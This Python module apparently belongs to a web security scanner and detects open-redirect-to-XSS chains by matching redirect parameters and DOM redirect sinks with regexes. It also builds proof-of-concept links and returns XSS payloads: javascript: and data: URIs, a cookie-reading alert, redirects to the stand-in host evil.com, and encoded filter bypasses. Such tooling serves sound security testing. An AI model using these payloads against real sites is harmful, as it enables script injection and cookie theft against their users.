"""Open Redirect -> XSS chain detection.

An open redirect is a parameter that takes a URL and bounces the browser
to it (``/r?url=...`` -> ``302 Location: ...``).  On its own it is
"only" a redirect, but it becomes XSS when the redirect target is a
``javascript:`` or ``data:text/html`` URI -- the browser executes the
URI in the victim origin's context.

Two flavors:

  1. **Server-side open redirect** -- the server reads ``?url=...`` and
     emits a ``302 Location: javascript:alert(1)``.  Some servers reject
     ``javascript:`` but accept ``data:`` or ``//evil.com/`` (which can
     host a script gadget).  Testing a payload chain is essential.

  2. **DOM-based redirect sink** -- client-side JS reads a query param
     and assigns it to a redirect sink::

         location        = params.get('next');
         location.href   = params.get('return');
         location.assign(params.get('goto'));
         location.replace(params.get('dest'));
         window.open(params.get('url'));

     If the param value is ``javascript:alert(1)``, the assignment
     executes the JS.  DOM-based redirects are not constrained by the
     server's URL validation, so they are often the more reliable XSS
     vector.

Exploitation:

  * Find an open redirect param (``url``, ``redirect``, ``next``, ...).
  * Test ``javascript:alert(1)`` directly.  If rejected, try
    ``data:text/html,<script>alert(1)</script>`` or ``//evil.com/xss``.
  * Build a PoC link::

        <a href="https://victim.example/r?url=javascript:alert(1)">click</a>

This module:

  1. Lists common redirect parameter names.
  2. Scans page HTML for DOM-based redirect sinks fed by user input.
  3. Detects redirect params referenced in the page (link hrefs, form
     actions, inline scripts).
  4. Builds PoC links that turn the open redirect into XSS.
"""
from __future__ import annotations
import re
from urllib.parse import urlencode


# Common open-redirect parameter names seen in real-world apps.
REDIRECT_PARAMS: list[str] = [
    "url", "redirect", "next", "return", "returnTo", "goto",
    "target", "dest", "destination", "continue", "to", "rurl",
    "redirect_url", "redirect_uri",
]


# DOM-based redirect sinks.  Each entry: (regex, severity, description).
DANGER_SINKS: list[tuple[str, str, str]] = [
    (r'\blocation\s*=\s*[^;\n]', "high",
     "location = <user input> (DOM redirect)"),
    (r'\blocation\s*\.\s*href\s*[\+\-\*\/]?=\s*[^;\n]', "high",
     "location.href = <user input>"),
    (r'\blocation\s*\.\s*assign\s*\(', "high",
     "location.assign(<user input>)"),
    (r'\blocation\s*\.\s*replace\s*\(', "high",
     "location.replace(<user input>)"),
    (r'\bwindow\s*\.\s*open\s*\(', "high",
     "window.open(<user input>)"),
    (r'\blocation\s*\.\s*search\s*[\+\-\*\/]?=\s*[^;\n]', "medium",
     "location.search = <user input>"),
    (r'\blocation\s*\.\s*hash\s*[\+\-\*\/]?=\s*[^;\n]', "medium",
     "location.hash = <user input>"),
    (r'document\s*\.\s*location\s*=\s*[^;\n]', "high",
     "document.location = <user input>"),
    (r'\btop\s*\.\s*location\s*=', "medium",
     "top.location = <user input> (frame breakout)"),
    (r'\bself\s*\.\s*location\s*=', "medium",
     "self.location = <user input>"),
]

SINK_RE = re.compile(
    "|".join("(?:%s)" % s[0] for s in DANGER_SINKS),
    re.IGNORECASE,
)


# Indicators that a snippet references user-controlled input: query
# string, hash, URLSearchParams, document.URL, window.location.
USER_INPUT_RE = re.compile(
    r'location\s*\.\s*(?:search|hash|href)'
    r'|searchParams\s*\.\s*get'
    r'|new\s+URLSearchParams'
    r'|document\s*\.\s*URL'
    r'|window\s*\.\s*location',
    re.IGNORECASE,
)


# Match ``?param=`` or ``&param=`` for any of the REDIRECT_PARAMS, so we
# can spot redirect params referenced in hrefs / scripts.
PARAM_REF_RE = re.compile(
    r'[?&](?:' + "|".join(re.escape(p) for p in REDIRECT_PARAMS) + r')=',
    re.IGNORECASE,
)


# Match ``<a href="...">`` and ``<form action="...">`` to find redirect
# params referenced in link targets.
LINK_HREF_RE = re.compile(
    r'<(?:a|form)\b[^>]*\b(?:href|action)\s*=\s*["\']?([^"\'>\s]+)',
    re.IGNORECASE,
)


#: How far past a sink we look for its taint source (unchanged since 113b).
_JUDGMENT_WINDOW = 200
#: How far before it -- a variable assigned from the query string lives here.
_LOOKBEHIND = 60

#: A qualifier glued in front of a sink: ``window.location.replace(``,
#: ``self.location =``.  USER_INPUT_RE's ``window.location`` alternative
#: matches this text, so it has to be masked along with the sink itself.
_QUALIFIER_RE = re.compile(r'(?:window|self|globalThis)\s*\.\s*$')


def _mask_span(block: str, m: "re.Match") -> tuple:
    """The part of a sink match that must never count as its own source.

    * assignment form: through the ``=`` (113b masked exactly the left-hand
      side so the right-hand side stays judgeable -- a pattern like
      ``location.href =\\s*[^;\\n]`` already ate one RHS character, and that
      character is frequently the ``l`` of ``location.hash``, which is the
      real source);
    * call form: the whole ``...location.replace(``.

    A qualifier glued in front of either is included.
    """
    matched = m.group(0)
    eq = matched.find("=")
    end = m.start() + (eq + 1 if eq != -1 else len(matched))
    start = m.start()
    # Searched in a short window, not `block[:start]`: a bundle is ~1 MB and
    # the regex is end-anchored, so slicing the whole prefix would copy
    # megabytes per sink for a match that can only live in the last ~12 chars.
    # The window's own offset has to be added back -- `pre.start()` is
    # relative to the slice, and getting that wrong silently un-masks every
    # qualifier (the bundle tests go red immediately).
    window = max(0, start - 24)
    pre = _QUALIFIER_RE.search(block[window:start])
    if pre:
        start = window + pre.start()
    return start, end


def _statement_end(block: str, m: "re.Match") -> int:
    """Index just past the sink's own statement, capped at ``_JUDGMENT_WINDOW``.

    Reading a fixed 200 characters past the sink reached into the NEXT
    statement.  In a minified bundle the next statement is routinely another
    redirect sink, which then quoted itself as this sink's taint source --
    measured on OWASP Juice Shop's main.js, where two hardcoded
    ``window.location.replace(L$.hostServer + `/profile`)`` calls stayed
    "exploitable" only because a sibling sink sat inside the window.
    """
    limit = min(len(block), m.end() + _JUDGMENT_WINDOW)
    if m.group(0).rstrip().endswith("("):
        depth = 1
        i = m.end()
        while i < limit:
            ch = block[i]
            if ch == "(":
                depth += 1
            elif ch == ")":
                depth -= 1
                if depth == 0:
                    return i + 1
            i += 1
        return limit
    nxt = re.search(r"[;\n]", block[m.end():limit])
    return m.end() + (nxt.end() if nxt else limit - m.end())


def redirect_params() -> list[str]:
    """Return the list of common open-redirect parameter names."""
    return list(REDIRECT_PARAMS)


def find_redirect_sinks(html_or_js: str) -> list[dict]:
    """Find DOM-based redirect sinks in the page/script.

    Returns a list of dicts::

        {
            "snippet":         str,        # the sink's own statement, plus
                                           # a 60-char look-behind
            "sink":            str,        # human-readable sink description
            "user_controlled": bool,       # a real source feeds this sink
            "exploitable":     bool,       # == user_controlled
        }
    """
    if not html_or_js:
        return []
    out: list[dict] = []
    # Extract <script> blocks if HTML; treat raw JS as one block.
    blocks = [m.group(1) for m in re.finditer(
        r'<script[^>]*>(.*?)</script>', html_or_js,
        re.IGNORECASE | re.DOTALL)]
    if not blocks:
        blocks = [html_or_js]
    for block in blocks:
        matches = list(SINK_RE.finditer(block))
        spans = [_mask_span(block, m) for m in matches]
        for m in matches:
            start = max(0, m.start() - _LOOKBEHIND)
            end = _statement_end(block, m)
            snippet = block[start:end]
            matched = m.group(0)
            # Phase 113b: a literal destination is never attacker
            # controlled, and the LEFT-hand side must not be counted as an
            # input source -- it is the sink itself, and USER_INPUT_RE's
            # ``location.href`` / ``window.location`` alternatives match it.
            # The right-hand side is kept: a real source frequently lives
            # there (``location.href = location.hash.slice(1)``).
            rhs_m = re.search(r"=\s*([^=].*)$", matched)
            literal_rhs = bool(
                rhs_m and re.match(r"""^['"`]""", rhs_m.group(1).strip()))
            # Phase 210b: mask EVERY sink span inside the window, not just
            # this one.  A neighbouring sink statement used to serve as this
            # sink's "proof of user input".
            chars = list(snippet)
            for s, e in spans:
                for i in range(max(s, start) - start, min(e, end) - start):
                    if 0 <= i < len(chars):
                        chars[i] = " "
            context = "".join(chars)
            user_controlled = (bool(USER_INPUT_RE.search(context))
                               and not literal_rhs)
            sinks_found = [desc for pat, _, desc in DANGER_SINKS
                           if re.search(pat, snippet, re.IGNORECASE)]
            desc = sinks_found[0] if sinks_found else "redirect sink"
            out.append({
                "snippet": snippet.strip()[:400],
                "sink": desc,
                "user_controlled": user_controlled,
                "exploitable": user_controlled,
            })
    return out


def find_redirect_param_refs(html: str) -> list[str]:
    """Find redirect params referenced in the page.

    Scans ``<a href>`` / ``<form action>`` URLs and any inline ``?param=``
    pattern for the canonical redirect parameter names.

    Returns: list of canonical param names actually present in the page
    (deduplicated, case-normalized to the canonical form).
    """
    if not html:
        return []
    found: list[str] = []
    # Look in hrefs/actions for redirect params.
    for m in LINK_HREF_RE.finditer(html):
        url = m.group(1)
        for p in REDIRECT_PARAMS:
            pat = re.compile(r'[?&]' + re.escape(p) + r'=', re.IGNORECASE)
            if pat.search(url) and p not in found:
                found.append(p)
    # Look anywhere for ``?param=`` / ``&param=`` patterns referencing
    # redirect params; normalize case to the canonical name.
    for m in PARAM_REF_RE.finditer(html):
        seg = html[m.start():m.end()].lstrip('?&').rstrip('=')
        for p in REDIRECT_PARAMS:
            if p.lower() == seg.lower() and p not in found:
                found.append(p)
                break
    return found


def analyze_page(html: str) -> dict:
    """Analyze a page for Open-Redirect -> XSS issues.

    Returns::

        {
            "has_redirect_sink":      bool,        # any redirect sink found
            "redirect_params_found":  list[str],   # params referenced in page
            "exploitable":            bool,        # sink fed by user input
            "sinks":                  list[dict],  # exploitable sinks only
        }
    """
    if not html:
        return {
            "has_redirect_sink": False,
            "redirect_params_found": [],
            "exploitable": False,
            "sinks": [],
        }
    sinks = find_redirect_sinks(html)
    params = find_redirect_param_refs(html)
    exploitable_sinks = [s for s in sinks if s["exploitable"]]
    return {
        "has_redirect_sink": bool(sinks),
        "redirect_params_found": params,
        "exploitable": bool(exploitable_sinks),
        "sinks": exploitable_sinks,
    }


def build_poc_link(
    target_url: str,
    param: str,
    payload: str = "javascript:alert(1)",
) -> str:
    """Build a PoC ``<a>`` link that turns the open redirect into XSS.

    The link, when clicked, hits ``target_url?param=<payload>``.  If the
    server (or DOM sink) honors the payload as a redirect target, the
    ``javascript:`` URI executes in the victim origin.
    """
    sep = "&" if "?" in target_url else "?"
    poc_url = f"{target_url}{sep}{urlencode({param: payload})}"
    return f'<a href="{poc_url}">click</a>'


def dangerous_payloads() -> list[str]:
    """High-yield payloads for Open-Redirect -> XSS testing."""
    return [
        # javascript: URI -- the primary XSS-via-redirect payload
        "javascript:alert(1)",
        "javascript:alert(document.cookie)",
        "javascript:eval(atob('YWxlcnQoMSk='))",
        # data: URI -- often accepted when javascript: is filtered
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        # Protocol-relative -- bounces to an attacker host serving a script
        "//evil.com/xss",
        "https://evil.com/xss",
        # Mixed-case / encoded bypasses for naive filters
        "JaVaScRiPt:alert(1)",
        "javascript&colon;alert(1)",
        "javascript%3aalert(1)",
    ]
